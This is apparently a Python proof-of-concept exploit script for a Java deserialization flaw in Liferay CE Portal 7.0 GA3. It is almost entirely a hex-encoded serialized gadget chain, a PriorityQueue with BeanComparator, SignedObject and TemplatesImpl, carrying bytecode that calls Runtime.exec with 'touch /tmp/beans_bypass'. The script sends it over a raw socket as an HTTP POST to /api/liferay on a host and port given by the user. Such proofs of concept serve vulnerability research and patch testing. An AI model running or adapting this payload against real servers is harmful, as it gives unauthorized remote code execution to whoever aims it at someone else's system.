#
# Exploits deserialization on Liferay CE Portal 7.0 GA3 via
# the url: /api/liferay. Note that we may be restricted from
# this URL via an ACL.
#
# Usage example:
# python beans_bypass.py 192.168.1.208 8080
#

import socket
import sys

if len(sys.argv) != 3:
    print 'Usage: ./beans_bypass.py <host> <port>'
    sys.exit(0)

payload = '\xac\xed\x00\x05\x73\x72\x00\x17\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x50\x72\x69\x6f\x72\x69\x74\x79\x51\x75\x65\x75\x65\x94\xda\x30\xb4\xfb\x3f\x82\xb1\x03\x00\x02\x49\x00\x04\x73\x69\x7a\x65\x4c\x00\x0a\x63\x6f\x6d\x70\x61\x72\x61\x74\x6f\x72\x74\x00\x16\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x43\x6f\x6d\x70\x61\x72\x61\x74\x6f\x72\x3b\x78\x70\x00\x00\x00\x02\x73\x72\x00\x2b\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x62\x65\x61\x6e\x75\x74\x69\x6c\x73\x2e\x42\x65\x61\x6e\x43\x6f\x6d\x70\x61\x72\x61\x74\x6f\x72\xe3\xa1\x88\xea\x73\x22\xa4\x48\x02\x00\x02\x4c\x00\x0a\x63\x6f\x6d\x70\x61\x72\x61\x74\x6f\x72\x71\x00\x7e\x00\x01\x4c\x00\x08\x70\x72\x6f\x70\x65\x72\x74\x79\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x78\x70\x73\x72\x00\x3f\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x63\x6f\x6d\x70\x61\x72\x61\x74\x6f\x72\x73\x2e\x43\x6f\x6d\x70\x61\x72\x61\x62\x6c\x65\x43\x6f\x6d\x70\x61\x72\x61\x74\x6f\x72\xfb\xf4\x99\x25\xb8\x6e\xb1\x37\x02\x00\x00\x78\x70\x74\x00\x06\x6f\x62\x6a\x65\x63\x74\x77\x04\x00\x00\x00\x03\x73\x72\x00\x1a\x6a\x61\x76\x61\x2e\x73\x65\x63\x75\x72\x69\x74\x79\x2e\x53\x69\x67\x6e\x65\x64\x4f\x62\x6a\x65\x63\x74\x09\xff\xbd\x68\x2a\x3c\xd5\xff\x02\x00\x03\x5b\x00\x07\x63\x6f\x6e\x74\x65\x6e\x74\x74\x00\x02\x5b\x42\x5b\x00\x09\x73\x69\x67\x6e\x61\x74\x75\x72\x65\x71\x00\x7e\x00\x0a\x4c\x00\x0c\x74\x68\x65\x61\x6c\x67\x6f\x72\x69\x74\x68\x6d\x71\x00\x7e\x00\x04\x78\x70\x75\x72\x00\x02\x5b\x42\xac\xf3\x17\xf8\x06\x08\x54\xe0\x02\x00\x00\x78\x70\x00\x00\x0a\xc7\xac\xed\x00\x05\x73\x72\x00\x17\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x50\x72\x69\x6f\x72\x69\x74\x79\x51\x75\x65\x75\x65\x94\xda\x30\xb4\xfb\x3f\x82\xb1\x03\x00\x02\x49\x00\x04\x73\x69\x7a\x65\x4c\x00\x0a\x63\x6f\x6d\x70\x61\x72\x61\x74\x6f\x72\x74\x00\x16\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x43\x6f\x6d\x70\x61\x72\x61\x74\x6f\x72\x3b\x78\x70\x00\x00\x00\x02\x73\x72\x00\x2b\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x62\x65\x61\x6e\x75\x74\x69\x6c\x73\x2e\x42\x65\x61\x6e\x43\x6f\x6d\x70\x61\x72\x61\x74\x6f\x72\xe3\xa1\x88\xea\x73\x22\xa4\x48\x02\x00\x02\x4c\x00\x0a\x63\x6f\x6d\x70\x61\x72\x61\x74\x6f\x72\x71\x00\x7e\x00\x01\x4c\x00\x08\x70\x72\x6f\x70\x65\x72\x74\x79\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x78\x70\x73\x72\x00\x3f\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x63\x6f\x6d\x70\x61\x72\x61\x74\x6f\x72\x73\x2e\x43\x6f\x6d\x70\x61\x72\x61\x62\x6c\x65\x43\x6f\x6d\x70\x61\x72\x61\x74\x6f\x72\xfb\xf4\x99\x25\xb8\x6e\xb1\x37\x02\x00\x00\x78\x70\x74\x00\x10\x6f\x75\x74\x70\x75\x74\x50\x72\x6f\x70\x65\x72\x74\x69\x65\x73\x77\x04\x00\x00\x00\x03\x73\x72\x00\x3a\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x78\x61\x6c\x61\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x78\x73\x6c\x74\x63\x2e\x74\x72\x61\x78\x2e\x54\x65\x6d\x70\x6c\x61\x74\x65\x73\x49\x6d\x70\x6c\x09\x57\x4f\xc1\x6e\xac\xab\x33\x03\x00\x06\x49\x00\x0d\x5f\x69\x6e\x64\x65\x6e\x74\x4e\x75\x6d\x62\x65\x72\x49\x00\x0e\x5f\x74\x72\x61\x6e\x73\x6c\x65\x74\x49\x6e\x64\x65\x78\x5b\x00\x0a\x5f\x62\x79\x74\x65\x63\x6f\x64\x65\x73\x74\x00\x03\x5b\x5b\x42\x5b\x00\x06\x5f\x63\x6c\x61\x73\x73\x74\x00\x12\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x3b\x4c\x00\x05\x5f\x6e\x61\x6d\x65\x71\x00\x7e\x00\x04\x4c\x00\x11\x5f\x6f\x75\x74\x70\x75\x74\x50\x72\x6f\x70\x65\x72\x74\x69\x65\x73\x74\x00\x16\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x50\x72\x6f\x70\x65\x72\x74\x69\x65\x73\x3b\x78\x70\x00\x00\x00\x00\xff\xff\xff\xff\x75\x72\x00\x03\x5b\x5b\x42\x4b\xfd\x19\x15\x67\x67\xdb\x37\x02\x00\x00\x78\x70\x00\x00\x00\x02\x75\x72\x00\x02\x5b\x42\xac\xf3\x17\xf8\x06\x08\x54\xe0\x02\x00\x00\x78\x70\x00\x00\x06\x94\xca\xfe\xba\xbe\x00\x00\x00\x31\x00\x38\x07\x00\x36\x01\x00\x33\x79\x73\x6f\x73\x65\x72\x69\x61\x6c\x2f\x70\x61\x79\x6c\x6f\x61\x64\x73\x2f\x75\x74\x69\x6c\x2f\x47\x61\x64\x67\x65\x74\x73\x24\x53\x74\x75\x62\x54\x72\x61\x6e\x73\x6c\x65\x74\x50\x61\x79\x6c\x6f\x61\x64\x07\x00\x04\x01\x00\x40\x63\x6f\x6d\x2f\x73\x75\x6e\x2f\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x78\x61\x6c\x61\x6e\x2f\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2f\x78\x73\x6c\x74\x63\x2f\x72\x75\x6e\x74\x69\x6d\x65\x2f\x41\x62\x73\x74\x72\x61\x63\x74\x54\x72\x61\x6e\x73\x6c\x65\x74\x07\x00\x06\x01\x00\x14\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x53\x65\x72\x69\x61\x6c\x69\x7a\x61\x62\x6c\x65\x01\x00\x10\x73\x65\x72\x69\x61\x6c\x56\x65\x72\x73\x69\x6f\x6e\x55\x49\x44\x01\x00\x01\x4a\x01\x00\x0d\x43\x6f\x6e\x73\x74\x61\x6e\x74\x56\x61\x6c\x75\x65\x05\xad\x20\x93\xf3\x91\xdd\xef\x3e\x01\x00\x06\x3c\x69\x6e\x69\x74\x3e\x01\x00\x03\x28\x29\x56\x01\x00\x04\x43\x6f\x64\x65\x0a\x00\x03\x00\x10\x0c\x00\x0c\x00\x0d\x01\x00\x0f\x4c\x69\x6e\x65\x4e\x75\x6d\x62\x65\x72\x54\x61\x62\x6c\x65\x01\x00\x12\x4c\x6f\x63\x61\x6c\x56\x61\x72\x69\x61\x62\x6c\x65\x54\x61\x62\x6c\x65\x01\x00\x04\x74\x68\x69\x73\x01\x00\x35\x4c\x79\x73\x6f\x73\x65\x72\x69\x61\x6c\x2f\x70\x61\x79\x6c\x6f\x61\x64\x73\x2f\x75\x74\x69\x6c\x2f\x47\x61\x64\x67\x65\x74\x73\x24\x53\x74\x75\x62\x54\x72\x61\x6e\x73\x6c\x65\x74\x50\x61\x79\x6c\x6f\x61\x64\x3b\x01\x00\x09\x74\x72\x61\x6e\x73\x66\x6f\x72\x6d\x01\x00\x72\x28\x4c\x63\x6f\x6d\x2f\x73\x75\x6e\x2f\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x78\x61\x6c\x61\x6e\x2f\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2f\x78\x73\x6c\x74\x63\x2f\x44\x4f\x4d\x3b\x5b\x4c\x63\x6f\x6d\x2f\x73\x75\x6e\x2f\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x78\x6d\x6c\x2f\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2f\x73\x65\x72\x69\x61\x6c\x69\x7a\x65\x72\x2f\x53\x65\x72\x69\x61\x6c\x69\x7a\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x3b\x29\x56\x01\x00\x0a\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x73\x07\x00\x19\x01\x00\x39\x63\x6f\x6d\x2f\x73\x75\x6e\x2f\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x78\x61\x6c\x61\x6e\x2f\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2f\x78\x73\x6c\x74\x63\x2f\x54\x72\x61\x6e\x73\x6c\x65\x74\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x01\x00\x08\x64\x6f\x63\x75\x6d\x65\x6e\x74\x01\x00\x2d\x4c\x63\x6f\x6d\x2f\x73\x75\x6e\x2f\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x78\x61\x6c\x61\x6e\x2f\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2f\x78\x73\x6c\x74\x63\x2f\x44\x4f\x4d\x3b\x01\x00\x08\x68\x61\x6e\x64\x6c\x65\x72\x73\x01\x00\x42\x5b\x4c\x63\x6f\x6d\x2f\x73\x75\x6e\x2f\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x78\x6d\x6c\x2f\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2f\x73\x65\x72\x69\x61\x6c\x69\x7a\x65\x72\x2f\x53\x65\x72\x69\x61\x6c\x69\x7a\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x3b\x01\x00\xa6\x28\x4c\x63\x6f\x6d\x2f\x73\x75\x6e\x2f\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x78\x61\x6c\x61\x6e\x2f\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2f\x78\x73\x6c\x74\x63\x2f\x44\x4f\x4d\x3b\x4c\x63\x6f\x6d\x2f\x73\x75\x6e\x2f\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x78\x6d\x6c\x2f\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2f\x64\x74\x6d\x2f\x44\x54\x4d\x41\x78\x69\x73\x49\x74\x65\x72\x61\x74\x6f\x72\x3b\x4c\x63\x6f\x6d\x2f\x73\x75\x6e\x2f\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x78\x6d\x6c\x2f\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2f\x73\x65\x72\x69\x61\x6c\x69\x7a\x65\x72\x2f\x53\x65\x72\x69\x61\x6c\x69\x7a\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x3b\x29\x56\x01\x00\x08\x69\x74\x65\x72\x61\x74\x6f\x72\x01\x00\x35\x4c\x63\x6f\x6d\x2f\x73\x75\x6e\x2f\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x78\x6d\x6c\x2f\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2f\x64\x74\x6d\x2f\x44\x54\x4d\x41\x78\x69\x73\x49\x74\x65\x72\x61\x74\x6f\x72\x3b\x01\x00\x07\x68\x61\x6e\x64\x6c\x65\x72\x01\x00\x41\x4c\x63\x6f\x6d\x2f\x73\x75\x6e\x2f\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x78\x6d\x6c\x2f\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2f\x73\x65\x72\x69\x61\x6c\x69\x7a\x65\x72\x2f\x53\x65\x72\x69\x61\x6c\x69\x7a\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x3b\x01\x00\x0a\x53\x6f\x75\x72\x63\x65\x46\x69\x6c\x65\x01\x00\x0c\x47\x61\x64\x67\x65\x74\x73\x2e\x6a\x61\x76\x61\x01\x00\x0c\x49\x6e\x6e\x65\x72\x43\x6c\x61\x73\x73\x65\x73\x07\x00\x27\x01\x00\x1f\x79\x73\x6f\x73\x65\x72\x69\x61\x6c\x2f\x70\x61\x79\x6c\x6f\x61\x64\x73\x2f\x75\x74\x69\x6c\x2f\x47\x61\x64\x67\x65\x74\x73\x01\x00\x13\x53\x74\x75\x62\x54\x72\x61\x6e\x73\x6c\x65\x74\x50\x61\x79\x6c\x6f\x61\x64\x01\x00\x08\x3c\x63\x6c\x69\x6e\x69\x74\x3e\x01\x00\x11\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x52\x75\x6e\x74\x69\x6d\x65\x07\x00\x2a\x01\x00\x0a\x67\x65\x74\x52\x75\x6e\x74\x69\x6d\x65\x01\x00\x15\x28\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x52\x75\x6e\x74\x69\x6d\x65\x3b\x0c\x00\x2c\x00\x2d\x0a\x00\x2b\x00\x2e\x01\x00\x17\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x62\x65\x61\x6e\x73\x5f\x62\x79\x70\x61\x73\x73\x08\x00\x30\x01\x00\x04\x65\x78\x65\x63\x01\x00\x27\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x50\x72\x6f\x63\x65\x73\x73\x3b\x0c\x00\x32\x00\x33\x0a\x00\x2b\x00\x34\x01\x00\x1e\x79\x73\x6f\x73\x65\x72\x69\x61\x6c\x2f\x50\x77\x6e\x65\x72\x31\x31\x36\x32\x35\x39\x31\x31\x38\x39\x39\x31\x38\x38\x37\x01\x00\x20\x4c\x79\x73\x6f\x73\x65\x72\x69\x61\x6c\x2f\x50\x77\x6e\x65\x72\x31\x31\x36\x32\x35\x39\x31\x31\x38\x39\x39\x31\x38\x38\x37\x3b\x00\x21\x00\x01\x00\x03\x00\x01\x00\x05\x00\x01\x00\x1a\x00\x07\x00\x08\x00\x01\x00\x09\x00\x00\x00\x02\x00\x0a\x00\x04\x00\x01\x00\x0c\x00\x0d\x00\x01\x00\x0e\x00\x00\x00\x2f\x00\x01\x00\x01\x00\x00\x00\x05\x2a\xb7\x00\x0f\xb1\x00\x00\x00\x02\x00\x11\x00\x00\x00\x06\x00\x01\x00\x00\x00\x2e\x00\x12\x00\x00\x00\x0c\x00\x01\x00\x00\x00\x05\x00\x13\x00\x37\x00\x00\x00\x01\x00\x15\x00\x16\x00\x02\x00\x17\x00\x00\x00\x04\x00\x01\x00\x18\x00\x0e\x00\x00\x00\x3f\x00\x00\x00\x03\x00\x00\x00\x01\xb1\x00\x00\x00\x02\x00\x11\x00\x00\x00\x06\x00\x01\x00\x00\x00\x33\x00\x12\x00\x00\x00\x20\x00\x03\x00\x00\x00\x01\x00\x13\x00\x37\x00\x00\x00\x00\x00\x01\x00\x1a\x00\x1b\x00\x01\x00\x00\x00\x01\x00\x1c\x00\x1d\x00\x02\x00\x01\x00\x15\x00\x1e\x00\x02\x00\x17\x00\x00\x00\x04\x00\x01\x00\x18\x00\x0e\x00\x00\x00\x49\x00\x00\x00\x04\x00\x00\x00\x01\xb1\x00\x00\x00\x02\x00\x11\x00\x00\x00\x06\x00\x01\x00\x00\x00\x37\x00\x12\x00\x00\x00\x2a\x00\x04\x00\x00\x00\x01\x00\x13\x00\x37\x00\x00\x00\x00\x00\x01\x00\x1a\x00\x1b\x00\x01\x00\x00\x00\x01\x00\x1f\x00\x20\x00\x02\x00\x00\x00\x01\x00\x21\x00\x22\x00\x03\x00\x08\x00\x29\x00\x0d\x00\x01\x00\x0e\x00\x00\x00\x1b\x00\x03\x00\x02\x00\x00\x00\x0f\xa7\x00\x03\x01\x4c\xb8\x00\x2f\x12\x31\xb6\x00\x35\x57\xb1\x00\x00\x00\x00\x00\x02\x00\x23\x00\x00\x00\x02\x00\x24\x00\x25\x00\x00\x00\x0a\x00\x01\x00\x01\x00\x26\x00\x28\x00\x09\x75\x71\x00\x7e\x00\x10\x00\x00\x01\xd4\xca\xfe\xba\xbe\x00\x00\x00\x31\x00\x1b\x07\x00\x02\x01\x00\x23\x79\x73\x6f\x73\x65\x72\x69\x61\x6c\x2f\x70\x61\x79\x6c\x6f\x61\x64\x73\x2f\x75\x74\x69\x6c\x2f\x47\x61\x64\x67\x65\x74\x73\x24\x46\x6f\x6f\x07\x00\x04\x01\x00\x10\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x07\x00\x06\x01\x00\x14\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x53\x65\x72\x69\x61\x6c\x69\x7a\x61\x62\x6c\x65\x01\x00\x10\x73\x65\x72\x69\x61\x6c\x56\x65\x72\x73\x69\x6f\x6e\x55\x49\x44\x01\x00\x01\x4a\x01\x00\x0d\x43\x6f\x6e\x73\x74\x61\x6e\x74\x56\x61\x6c\x75\x65\x05\x71\xe6\x69\xee\x3c\x6d\x47\x18\x01\x00\x06\x3c\x69\x6e\x69\x74\x3e\x01\x00\x03\x28\x29\x56\x01\x00\x04\x43\x6f\x64\x65\x0a\x00\x03\x00\x10\x0c\x00\x0c\x00\x0d\x01\x00\x0f\x4c\x69\x6e\x65\x4e\x75\x6d\x62\x65\x72\x54\x61\x62\x6c\x65\x01\x00\x12\x4c\x6f\x63\x61\x6c\x56\x61\x72\x69\x61\x62\x6c\x65\x54\x61\x62\x6c\x65\x01\x00\x04\x74\x68\x69\x73\x01\x00\x25\x4c\x79\x73\x6f\x73\x65\x72\x69\x61\x6c\x2f\x70\x61\x79\x6c\x6f\x61\x64\x73\x2f\x75\x74\x69\x6c\x2f\x47\x61\x64\x67\x65\x74\x73\x24\x46\x6f\x6f\x3b\x01\x00\x0a\x53\x6f\x75\x72\x63\x65\x46\x69\x6c\x65\x01\x00\x0c\x47\x61\x64\x67\x65\x74\x73\x2e\x6a\x61\x76\x61\x01\x00\x0c\x49\x6e\x6e\x65\x72\x43\x6c\x61\x73\x73\x65\x73\x07\x00\x19\x01\x00\x1f\x79\x73\x6f\x73\x65\x72\x69\x61\x6c\x2f\x70\x61\x79\x6c\x6f\x61\x64\x73\x2f\x75\x74\x69\x6c\x2f\x47\x61\x64\x67\x65\x74\x73\x01\x00\x03\x46\x6f\x6f\x00\x21\x00\x01\x00\x03\x00\x01\x00\x05\x00\x01\x00\x1a\x00\x07\x00\x08\x00\x01\x00\x09\x00\x00\x00\x02\x00\x0a\x00\x01\x00\x01\x00\x0c\x00\x0d\x00\x01\x00\x0e\x00\x00\x00\x2f\x00\x01\x00\x01\x00\x00\x00\x05\x2a\xb7\x00\x0f\xb1\x00\x00\x00\x02\x00\x11\x00\x00\x00\x06\x00\x01\x00\x00\x00\x3b\x00\x12\x00\x00\x00\x0c\x00\x01\x00\x00\x00\x05\x00\x13\x00\x14\x00\x00\x00\x02\x00\x15\x00\x00\x00\x02\x00\x16\x00\x17\x00\x00\x00\x0a\x00\x01\x00\x01\x00\x18\x00\x1a\x00\x09\x70\x74\x00\x04\x50\x77\x6e\x72\x70\x77\x01\x00\x78\x71\x00\x7e\x00\x0d\x78\x75\x71\x00\x7e\x00\x0c\x00\x00\x00\x2e\x30\x2c\x02\x14\x2f\x5a\x06\x85\xbe\x4e\xc0\xa5\x01\x35\xbb\x0b\xa7\x43\x1d\xce\x70\x55\x1f\x7c\x02\x14\x24\xf2\x1e\x25\x4c\x14\xe5\x46\x55\xbd\xfd\x1a\x18\x11\x95\x67\x53\x10\xd5\xed\x74\x00\x0b\x53\x48\x41\x31\x77\x69\x74\x68\x44\x53\x41\x71\x00\x7e\x00\x0b\x78'

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = (sys.argv[1], int(sys.argv[2]))
print '[+] connecting to %s port %s' % server_address
sock.connect(server_address)

print '[+] Sending payload...'
pwned = ('POST /api/liferay HTTP/1.1\r\n' +
        'Content-Type: application/octet-stream\r\n' +
        'User-Agent: Robots are my next of kin\r\n' +
        'Host: ' + sys.argv[1] + ':' + sys.argv[2] +' \r\n' +
        'Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\n' +
        'Connection: keep-alive\r\n' +
        'Content-Length: ' + str(len(payload)) + '\r\n\r\n')
pwned += payload
sock.sendall(pwned)
sock.close()

print '[+] Done!'
